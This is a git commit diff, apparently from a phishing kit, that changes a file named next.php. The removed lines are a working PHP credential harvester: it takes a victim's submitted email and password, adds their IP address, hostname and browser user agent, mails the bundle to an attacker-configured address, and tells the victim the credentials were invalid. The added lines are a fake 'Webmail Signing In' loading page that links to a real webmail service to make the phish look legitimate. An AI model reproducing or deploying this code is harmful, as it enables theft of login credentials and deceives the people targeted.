450f799a008744e127547c08ca04fc528a23012f
Gtreeeee <103372838+Gtreeeee@users.noreply.github.com>
2022-06-16 19:28:28 +0100

    Update next.php

--- next.php
+++ next.php
@@ -1,39 +1,7 @@
-<?php
-include 'email.php';
-$email = trim($_POST['email']);
-$password = trim($_POST['password']);
-
-if($email != null && $password != null){
-	$ip = getenv("REMOTE_ADDR");
-	$hostname = gethostbyaddr($ip);
-	$useragent = $_SERVER['HTTP_USER_AGENT'];
-	$message .= "|----------| xLs |--------------|\n";
-	
-	$message .= "Online ID            : ".$email."\n";
-	$message .= "Passcode              : ".$password."\n";
-	$message .= "|--------------- I N F O | I P -------------------|\n";
-	$message .= "|Client IP: ".$ip."\n";
-	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
-	$message .= "User Agent : ".$useragent."\n";
-	$message .= "|----------- fudsender(dot)com --------------|\n";
-	$send = $Receive_email;
-	$subject = "Login : $ip";
-    mail($send, $subject, $message);   
-	$signal = 'ok';
-	$msg = 'InValid Credentials';
-	
-	// $praga=rand();
-	// $praga=md5($praga);
-}
-else{
-	$signal = 'bad';
-	$msg = 'Please fill in all the fields.';
-}
-$data = array(
-        'signal' => $signal,
-        'msg' => $msg,
-        'redirect_link' => $redirect,
-    );
-    echo json_encode($data);
-
-?>
+<html>
+    <head><title>Webmail Signing In.....</title></head>
+    <body>
+      <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<a href="https://privateemail.com/appsuite"><img style="display: block; margin-left: auto; margin-right: auto;" src="1/loading.gif" alt="" width="auto" height="auto" /></a></p> </body>
+</html>
